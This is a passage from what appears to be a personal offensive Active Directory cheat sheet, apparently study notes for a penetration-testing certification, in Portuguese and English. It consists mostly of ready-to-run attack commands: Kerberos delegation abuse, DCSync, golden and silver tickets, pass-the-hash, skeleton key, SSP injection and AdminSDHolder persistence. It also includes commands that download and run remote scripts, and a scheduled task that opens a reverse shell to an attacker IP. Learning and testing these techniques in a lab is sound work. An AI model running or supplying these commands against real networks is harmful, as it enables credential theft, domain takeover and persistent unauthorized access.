rubeus.exe s4u /user:yamcha /rc4:1A9D94FDE4F369D53FA5515D1D6BEEE0 /impersonateuser:"administrator" /msdsspn:"cifs/TECH-DC01.TECH.LOCAL" /altservice:ldap /ptt 
```
ATAQUE DCSYNC:
```
.\Mimikatz
lsadump::dcsync /user:tech\krbtgt
lsadump::dcsync /domain:TECH.LOCAL /all /csv
```
- OPÇÃO 2 - ACESSAR REMOTAMENTE VIA PSREMOTE
OBTER TICKET: host,http,wsman,rpcss
```
rubeus.exe s4u /user:yamcha /rc4:1A9D94FDE4F369D53FA5515D1D6BEEE0 /impersonateuser:"administrator" /msdsspn:"cifs/TECH-DC01.TECH.LOCAL" /altservice:host,http,wsman,rpcss /ptt 
```
ACESSAR REMOTAMENTE:
```
enter-pssession -computername TECH-DC01.TECH.LOCAL
```
- OPÇÃO 3 - CRIAR GOLDEN TICKETS
```
kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /krbtgt:28ec87e3414d019c944786bf447fd666 id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt
```

## RESOURCE-BASED CONSTRAINED DELEGATION
This is similar to the basic Constrained Delegation but instead of giving permissions to an object to impersonate any user against a service. Resource-based Constrain Delegation sets in the object who is able to impersonate any user against it.

In this case, the constrained object will have an attribute called msDS-AllowedToActOnBehalfOfOtherIdentity with the name of the user that can impersonate any other user against it.

Another important difference from this Constrained Delegation to the other delegations is that any user with write permissions over a machine account (GenericAll/GenericWrite/WriteDacl/WriteProperty/etc) can set the msDS-AllowedToActOnBehalfOfOtherIdentity (In the other forms of Delegation you needed domain admin privs).

If you have an account or computer with the constrained delegation privilege, it is possible to impersonate any other user and authenticate yourself to a service where the user is allowed to delegate.

##### RESOURCE-BASED CONSTRAINED DELEGATION - LISTAR OBJETOS COM DELEGAÇÃO RBCD CONFIGURADA
```
Get-ADComputer -Filter * -Properties * | ?{$_.PrincipalsAllowedToDelegateToAccount -ne "$null"} | select samaccountname, PrincipalsAllowedToDelegateToAccount 
```
##### RESOURCE-BASED CONSTRAINED DELEGATION - LISTAR QUANTOS COMPUTADORES UM USUARIO PODE ADICIONAR NO DOMINIO
```
Get-ADObject -Identity "DC=TECH,DC=LOCAL" -Properties MS-DS-MachineAccountQuota
```
```
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
```
SharpView Get-DomainObject -Domain tech.local
```
```
StandIn.exe --object ms-DS-MachineAccountQuota=*
```
##### RESOURCE-BASED CONSTRAINED DELEGATION - FIND COMPUTERS AND USERS WITH GENERICWRITE, GENERICALL
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
```
```
Find-Find-InterestingDomainAcl
Find-InterestingDomainAcl | ?{$_.IdentityReferenceClass -eq 'computer'}
Find-InterestingDomainAcl | ?{$_.IdentityReferenceClass -eq 'user'}
```
##### RESOURCE-BASED CONSTRAINED DELEGATION - CRIAR CONTA FALSA DE COMPUTADOR
CARREGAR O POWERMAD
```
curl https://github.com/n0ts0cial/oscp/raw/main/Powermad.ps1 -Outfile Powermad.ps1
import-module .\powermad.ps1
```
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Powermad.ps1")
```
CRIAR UMA CONTA FALSA DE COMPUTADOR
```
New-MachineAccount -MachineAccount ATTACKER2 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
OU USAR O STANDIN
```
StandIn.exe --computer ATTACKER2 --make
```
OU USAR O IMPACKET
```
impacket-addcomputer -method SAMR -computer-name ATTACKER2$ -computer-pass Password123 purple.lab/pentestlab:Password1234
```
##### RESOURCE-BASED CONSTRAINED DELEGATION - VERIFICAR SE A CONTA FALSA FOI CRIADA
```
Get-ADComputer -identity ATTACKER2 -Properties *
Get-ADComputer -identity ATTACKER2 -Properties * | select Samaccountname, Enabled
```
```
Get-DomainComputer ATTACKER2
```
##### RESOURCE-BASED CONSTRAINED DELEGATION - CONFIGURAR DELEGAÇÃO RBCD NO ALVO PARA NOSSO FALSO COMPUTADOR
```
Set-ADComputer server02 -PrincipalsAllowedToDelegateToAccount ATTACKER2$
```
OU POWERVIEW
```
$ComputerSid = Get-DomainComputer ATTACKER2 -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer server02 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
##### RESOURCE-BASED CONSTRAINED DELEGATION - VERIFICAR DELEGAÇÃO RBCD
```
Get-ADComputer server02 -Properties PrincipalsAllowedToDelegateToAccount
Get-ADComputer server02 -Properties PrincipalsAllowedToDelegateToAccount | select samaccountname, PrincipalsAllowedToDelegateToAccount 
Get-ADComputer -Filter * -Properties * | ?{$_.PrincipalsAllowedToDelegateToAccount -ne "$null"} | select samaccountname, PrincipalsAllowedToDelegateToAccount 
```
OU POWERVIEW - VALORES ESTRANHOS
```
Get-DomainComputer server02 -Properties 'msds-allowedtoactonbehalfofotheridentity'
```
##### RESOURCE-BASED CONSTRAINED DELEGATION - NO RUBEUS, GERAR O HASH RC4 DA SENHA DO COMPUTADOR FALSO: ATTACKER2 : 32ED87BDB5FDC5E9CBA88547376818D4
```
.\Rubeus.exe hash /password:123456 /user:ATTACKER2$ /domain:tech.local

```
##### RESOURCE-BASED CONSTRAINED DELEGATION - NO RUBEUS, SOLICITAR TGS PARA A MAQUINA QUE TEMOS ACESSO PARA OS SERVICOS AUTORIZADOS NO AD: (cifs/TECH-DC01.TECH.LOCAL)
```
.\rubeus.exe s4u /user:ATTACKER2$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/server02 /domain:tech.local /ptt
.\rubeus.exe s4u /user:ATTACKER2$ /aes256:E1B7610EFD532B94B231C753ADCD74C20B8812F27D8A65D913F4834FE1877E59 /aes128:D99EDC9BAFB9456F2DD3AF994CE99F25 /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/server02 /domain:tech.local /ptt
```
SOLICITAR TICKET PARA OUTROS SERVIÇOS
```
.\rubeus.exe s4u /user:ATTACKER2$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/server02 /domain:tech.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt
.\rubeus.exe s4u /user:ATTACKER2$ /aes256:E1B7610EFD532B94B231C753ADCD74C20B8812F27D8A65D913F4834FE1877E59 /aes128:D99EDC9BAFB9456F2DD3AF994CE99F25 /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/server02 /domain:tech.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt
```





























## ATAQUE DNSADMINS
If you own a user who is a member of the 'DNS admin' it is possible to perform various attacks on the DNS server (usually Domain Controller) It is possible to get a reverse shell with this, but this puts the whole DNS traffic flat within the domain as this keeps the DNS service busy! For more information see [ https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise ]
##### DNSADMINS - LOAD REQUIREMENTS
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
```
##### DNSADMINS - FIND MEMBERS OF DNSADMIN 
```
Get-ADGroupMember -Identity "DNSADMINS" | select objectClass, SamAccountName | Format-Table
```
```
Get-NetgroupMember -identity 'DNSADMINS'
Get-NetgroupMember -identity 'DNSADMINS' | select MemberName
Get-NetgroupMember -identity 'DNSADMINS' | select groupname,MemberName,MemberObjectClass
Get-NetgroupMember -identity 'DNSADMINS' -domain 'tech.local'
```
##### DNSADMINS ATTACK (MUST HAVE RSAT DNS) (CRIAR UM COMPARTILHAMENTO E COLOCAR A DLL LÁ)
Share the directory the DLl is in for everyone so its accessible. logs all DNS queries on C:\Windows\System32\kiwidns.log
```
dnscmd tech-dnsserver01 /config /serverlevelplugindll \\10.10.10.10\dll\mimilib.dll
```
DELETAR CHAVE DO REGISTRO:
```
Get-ItemPropertyValue -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters" -Name ServerLevelPluginDll
Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters" -Name ServerLevelPluginDll
```
RESTART THE DNS SERVER
```
Sc \\tech-dnsserver01 stop dns
Sc \\tech-dnsserver01 start dns
```






```
$FormatEnumerationLimit=-1
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
```
ENCONTRAR APENAS USUARIOS
```
$FormatEnumerationLimit=-1
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
```
































# LATERAL MOVEMENT - ACTIVE DIRECTORY
## LATERAL MOVEMENT - MIMIKATZ
##### LATERAL MOVEMENT MIMIKATZ - LOAD REQUIREMENTS
```
curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
cd x64
.\mimikatz.exe
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz
```
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
Invoke-Mimikatz
```
##### LATERAL MOVEMENT MIMIKATZ - DUMP CREDENTIAL LOCAL MACHINE
```
Privilege::debug
Sekurlsa::logonpasswords
```
##### LATERAL MOVEMENT MIMIKATZ - OVER PASS THE HASH WINDOWS PARA WINDOWS (FUNCIONOU COM O PSEXEC)
```
Privilege::debug
Sekurlsa::pth /user:goku /domain:tech.local /ntlm:4533aaba903fbbe1377deb1642743283 /run:powershell.exe
Sekurlsa::pth /user:tech\goku /domain:tech.local /ntlm:4533aaba903fbbe1377deb1642743283 /run:powershell.exe
Sekurlsa::pth /user:goku /domain:tech.local /aes256:e22ebc7f0546cb07424c6b261596c27440b876c01aa3af04ace01da58fdea26f /run:powershell.exe
```
O USUARIO SEMPRE CONTINUA O MESMO INICIAL.
```
curl https://github.com/n0ts0cial/oscp/raw/main/PsExec.exe -outfile PsExec.exe
psexec \\server01 cmd
```
##### LATERAL MOVEMENT RUBEUS - OVER PASS THE HASH WINDOWS PARA WINDOWS (FUNCIONOU LINDO)
```
curl https://github.com/n0ts0cial/oscp/raw/main/rubeus/Rubeus.exe -Outfile rubeus.exe
.\Rubeus.exe asktgt /domain:tech.local /user:goku /rc4:4533aaba903fbbe1377deb1642743283 /ptt
```

##### LATERAL MOVEMENT CRACKMAPEXEC - OVER PASS THE HASH LINUX PARA WINDOWS (FUNCIONOU - COMANDO)
```
crackmapexec smb 172.31.13.86 -u goku -H 4533aaba903fbbe1377deb1642743283 -d tech.local -x whoami
```
##### LATERAL MOVEMENT IMPACKET-WMIEXEC - OVER PASS THE HASH LINUX PARA WINDOWS (FUNCIONOU - PROMPT COMO O USUARIO)
```
impacket-wmiexec tech.local/goku@172.31.11.96 -hashes 00000000000000000000000000000000:4533aaba903fbbe1377deb1642743283
```
##### LATERAL MOVEMENT IMPACKET-PSEXEC - OVER PASS THE HASH LINUX PARA WINDOWS (FUNCIONOU - PROMPT COMO O NTAUTHORITY)
```
impacket-psexec tech.local/goku@172.31.11.96 -hashes 00000000000000000000000000000000:4533aaba903fbbe1377deb1642743283
```
##### LATERAL MOVEMENT IMPACKET-SMBEXEC - OVER PASS THE HASH LINUX PARA WINDOWS (FUNCIONOU - PROMPT COMO O NTAUTHORITY)
```
impacket-smbexec tech.local/goku@172.31.11.96 -hashes 00000000000000000000000000000000:4533aaba903fbbe1377deb1642743283
```
##### LATERAL MOVEMENT IMPACKET-ATEXEC - OVER PASS THE HASH LINUX PARA WINDOWS (FUNCIONOU - TAREFA AGENDADA COMO NTAUTHORITY)
```
impacket-atexec -hashes 00000000000000000000000000000000:4533aaba903fbbe1377deb1642743283 tech.local/goku@172.31.11.96 whoami
```
# PERSISTENCE - ACTIVE DIRECTORY
## GOLDEN TICKET MIMIKATZ
##### GOLDEN TICKET MIMIKATZ - LOAD REQUIREMENTS
```
curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
cd x64
.\mimikatz.exe
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz
```
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
Invoke-Mimikatz
```
##### GOLDEN TICKET MIMIKATZ - PEGAR O HASH DE KRBTGT (COMO ADMIN):
```
privilege::debug
lsadump::lsa /patch
```
##### GOLDEN TICKET MIMIKATZ - PEGAR O HASH DE KRBTGT (COMO ADMIN MAS TERMINAL NORMAL E DE QQ MAQUINA):
```
Invoke-Mimikatz
lsadump::dcsync /user:tech\krbtgt
```
##### GOLDEN TICKET MIMIKATZ - GERAR TICKET P QQ USUARIO EM QQ MAQUINA (TERMINAL NORMAL):
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
Invoke-Mimikatz
kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /krbtgt:28ec87e3414d019c944786bf447fd666 id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt
```
##### GOLDEN TICKET MIMIKATZ - GERAR TICKET P QQ USUARIO EM QQ MAQUINA (TERMINAL NORMAL) - SALVAR O TICKET COMO TICKET.KIRBI:
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
Invoke-Mimikatz
kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /krbtgt:28ec87e3414d019c944786bf447fd666 id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ticket
```
##### GOLDEN TICKET MIMIKATZ - TESTE DE CONECTIVIDADE (NAO CONECTOU NO DC):
```
dir \\server01\c$
enter-pssession -computername server01
whoami > c:\eu.txt
```
## SILVER TICKET MIMIKATZ
##### SILVER TICKET MIMIKATZ - LOAD REQUIREMENTS
```
curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
cd x64
.\mimikatz.exe
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz
```
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
Invoke-Mimikatz
```
##### SILVER TICKET MIMIKATZ - PEGAR O HASH DO COMPUTADOR ALVO (COMO ADMIN):
```
privilege::debug
lsadump::lsa /patch
```
##### SILVER TICKET MIMIKATZ - GERAR TICKET P SERVICO NO COMPUTADOR ALVO EM QQ MAQUINA (TERMINAL NORMAL):
```
kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01.tech.local /service:cifs /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01 /service:cifs /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
```
##### SILVER TICKET MIMIKATZ - GERAR TICKET P SERVICO NO COMPUTADOR ALVO EM QQ MAQUINA (TERMINAL NORMAL): ACESSAR COMPARTILHAMENTOS
```
kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01.tech.local /service:cifs /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01 /service:cifs /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
```
```
dir \\server01\c$
dir \\server01.tech.local\c$
```
##### SILVER TICKET MIMIKATZ - GERAR TICKET P SERVICO NO COMPUTADOR ALVO EM QQ MAQUINA (TERMINAL NORMAL): CRIAR TAREFAS AGENDADAS
```
kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01.tech.local /service:host /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01 /service:host /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
```
CRIAR TAREFA AGENDADA
```
schtasks /create /S server01 /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "STCHECK" /TR "cmd /c whoami > c:\eu.txt"
schtasks /create /S server01.tech.local /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "STCHECK" /TR "cmd /c whoami > c:\eu.txt"
```
RODAR TAREFA AGENDADA
```
schtasks /RUN /S server01 /TN "STCHECK"
schtasks /RUN /S server01.tech.local /TN "STCHECK"
```
CRIAR TAREFA AGENDADA PARA SHEL LREVERSO:
```
schtasks /create /S tech-dc01 /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "REVERSESHELL" /TR "powershell.exe -c 'IEX(New-Object System.Net.WebClient).DownloadString(''https://github.com/n0ts0cial/oscp/raw/main/Invoke-PowerShellTcp2.ps1''')'"
```
ULTIMA LINHA DO ARQUIVO Invoke-PowerShellTcp2.ps1:
```
Invoke-PowerShellTcp -Reverse -IPAddress 172.31.13.86 -Port 666
```
RODAR A TAREFA AGENDADA:
```
schtasks /RUN /S tech-dc01 /TN "REVERSESHELL"
```
AGUARDAR A CONEXÃO:
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/powercat.ps1")
powercat -l -p 666 -v
```
##### SILVER TICKET MIMIKATZ - GERAR TICKET P SERVICO NO COMPUTADOR ALVO EM QQ MAQUINA (TERMINAL NORMAL): POWERSHELL REMOTING
```
kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:tech-dc01.tech.local /service:http /rc4:30e8b803609241d0e6ae3587a932d97a /user:administrator /ptt
kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:tech-dc01.tech.local /service:wsman /rc4:30e8b803609241d0e6ae3587a932d97a /user:administrator /ptt
```
ACESSAR O COMPUTADOR REMOTO:
```
enter-pssession -computername tech-dc01.tech.local
```
##### SILVER TICKET MIMIKATZ - GERAR TICKET P SERVICO NO COMPUTADOR ALVO EM QQ MAQUINA (TERMINAL NORMAL): LDAP DCSYNC
```
kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:tech-dc01.tech.local /service:ldap /rc4:30e8b803609241d0e6ae3587a932d97a /user:administrator /ptt
```
RODAR O ATAQUE DCSYNC:
```
lsadump::dcsync /user:tech\krbtgt
```
##### SILVER TICKET MIMIKATZ - GERAR TICKET P SERVICO NO COMPUTADOR ALVO EM QQ MAQUINA (TERMINAL NORMAL): WMI COMMAND
```
kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:tech-dc01.tech.local /service:host /rc4:30e8b803609241d0e6ae3587a932d97a /user:administrator /ptt
kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:tech-dc01.tech.local /service:rpcss /rc4:30e8b803609241d0e6ae3587a932d97a /user:administrator /ptt
```
RODAR COMANDO VIA WMI:
```
Invoke-WmiMethod win32_process -ComputerName tech-dc01.tech.local -name create -argumentlist "cmd.exe /c whoami > c:\fudeu.txt"
```
[SPN](https://adsecurity.org/?page_id=183)

SERVIÇOS:
- HOST, RPCSS - for WMI interactions
- HOST for Schtasks
- LDAP for LDAP including DCsync attack
- HOST, HTTP for WinRM
- HOST, HTTP, WSMAN, RPCSS - for PowerShell Remoting

SERVIÇOS:
- WMI INTERACTIONS - HOST, RPCSS
- POWERSHELL REMOTING - HOST, HTTP, WSMAN, RPCSS     DEPENDE: WSMAN,RPCSS
- WINRM - HOST,HTTP *** EM ALGUNS CASOIS PODE PEDIR SOMENTE WINRM
- SCHEDULED TASKS - HOST
- WINDOWS FILE SHARE  - CIFS
- PSEXEC - CIFS
- LDAP OPERATIONS - LDAP
- LDAP DCSYNC - LDAP
- WINDOWS REMOTE SERVER ADMINISTRAION TOOLS - RPCSS, LDAP, CIFS
- GOLDEN TICKET - krbtgt
## SKELETON KEY MIMIKATZ
##### SKELETON KEY MIMIKATZ - LOAD REQUIREMENTS
```
curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
cd x64
.\mimikatz.exe
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz
```
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
Invoke-Mimikatz
```
##### SKELETON KEY MIMIKATZ - EXECUTAR PATCH NO DC(COMO ADMIN):
```
privilege::debug
misc::skeleton
```
ACESSAR REMOTAMENTE: (Senha: mimikatz)
```
enter-pssession -computername tech-dc01 -credential tech\administrator
```
##### SKELETON KEY MIMIKATZ - EXECUTAR PATCH NO DC(COMO ADMIN) SE O LSA.EXE ESTIVER PROTEGIDO:
```
curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
cd x64
.\mimikatz.exe
```
```
privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
!-
```
ACESSAR REMOTAMENTE: (Senha: mimikatz)
```
enter-pssession -computername tech-dc01 -credential tech\administrator
```
## DSRM MIMIKATZ (CONTA DE ADMINISTRADOR LOCAL DO DOMAIN CONTROLLER)
##### DSRM MIMIKATZ - LOAD REQUIREMENTS
```
curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
cd x64
.\mimikatz.exe
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz
```
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
Invoke-Mimikatz
```
##### DSRM MIMIKATZ - OBTER HASH DO ADMINITRADOR LOCAL NO DC(COMO ADMIN):
PRIVILEGE PRIMEIRO E TOKEN DEPOIS, ESSA EU NÃO SABIA
```
privilege::debug
token::elevate
lsadump::sam
```
CRIAR ENTRADA NO REGISTRO PARA LIBERAR LOGIN DO ADMINISTRADOR LOCAL
```
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
```
EM QUALQUER COMPUTADOR DA REDE, FAZER O PASS THE HASH. (PROMPT ELEVADO)
```
Privilege::debug
Sekurlsa::pth /user:administrator /domain:tech-dc01 /ntlm:58056bc12cea73a9ce6ea02727fbd8f0 /run:powershell.exe
```
TESTAR A CONEXÃO NO NOVA JANELA:
```
dir \\tech-dc01\c$
```

### CUSTOM SSP MIMIKATZ - EXECUTAR PATCH NO DC(COMO ADMIN):
##### CUSTOM SSP MIMIKATZ - LOAD REQUIREMENTS
```
curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
cd x64
```
##### OPTION 1 - USING MIMIKATZ INJECT INTO LASS (NOT STABLE 2016)
```
.\mimikatz.exe
privilege::debug
misc::memssp
```
##### OPTION 2 - COPIAR DLL E ALTERAR REGISTRO
```
copy mimilib.dll C:\Windows\System32
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages' 
$packages += "mimilib" 
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages 
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```
All Local Logons on the DC are logged to:
C:\Windows\System32\kiwisso.log
### ADMIN SDHOLDER
##### ADMIN SDHOLDER - DEFAULT PROTECTED ADMINISTRATIVE GROUPS IN AD

- Enterprise Admins
- Schema Admins
- Domain Admins
- Administrators
- Account Operators
- Server Operators
- Print Operators
- Backup Operators
- Cert Publishers
- Domain Controllers
- Read-Only Domain Controllers
- Replicator

##### ADMIN SDHOLDER - LIST PROTECTED USERS:
```
Get-ADUser -LDAPFilter "(admincount=1)" | Select Name,DistinguishedName
```
##### ADMIN SDHOLDER - LIST PROTECTED GROUPS:
```
Get-ADGroup -LDAPFilter "(admincount=1)" | Select Name,DistinguishedName
```
##### ADMIN SDHOLDER - LIST PERMISSIONS
```
(Get-ACL "AD:CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL").access | Select IdentityReference, AccessControlType, ActiveDirectoryRights
```
```
$FormatEnumerationLimit=-1
(Get-ACL "AD:CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL").access | Select IdentityReference, AccessControlType, ActiveDirectoryRights | Out-String -Width 4096
```
##### ADMIN SDHOLDER - LIST PERMISSIONS FROM 1 USER OVER SDHOLDER
```
(Get-Acl -Path 'AD:\CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL').Access | ?{$_.IdentityReference -match 'pentester'} | Select IdentityReference, AccessControlType, ActiveDirectoryRights
```
##### ADMIN SDHOLDER - LIST PERMISSIONS (POWERVIEW)
```
Get-ObjectAcl -Identity 'CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL' | Select SecurityIdentifier, AccessControlType, ActiveDirectoryRights
```
TRADUZIR SID PARA USERNAME:
```
$SID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-4215187987-3124207031-433979976-1109")
$objUser = $SID.Translate([System.Security.Principal.NTAccount])
$objUser.Value
```
##### ADMIN SDHOLDER - ADICIONAR GENERICALL PARA USUARIO
```
$MyAdmin = (get-aduser pentester).sid
$MyDistinguishedName = "CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL"
$MyDistinguishedNameAD = $MyDistinguishedName = "AD:$MyDistinguishedName"
$MyACL= Get-ACL $MyDistinguishedNameAD
$MyADRights = [System.DirectoryServices.ActiveDirectoryRights] "Genericall"
$MyType = [System.Security.AccessControl.AccessControlType] "Allow"
$MyInheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "All"
$MyACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $MyAdmin,$MyADRights,$MyType,$MyInheritanceType
$MyACL.AddAccessRule($MyACE)
Set-acl -aclobject $MyACL $MyDistinguishedNameAD
```
##### ADMIN SDHOLDER - ADICIONAR FULL CONTROLL PARA USUARIO (POWERVIEW)
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
```
```
Add-ObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL' -PrincipalIdentity pentester -Rights All -Verbose
```
##### ADMIN SDHOLDER - ADICIONAR OUTRAS PERMISSÕES PARA USUARIO (POWERVIEW)
```
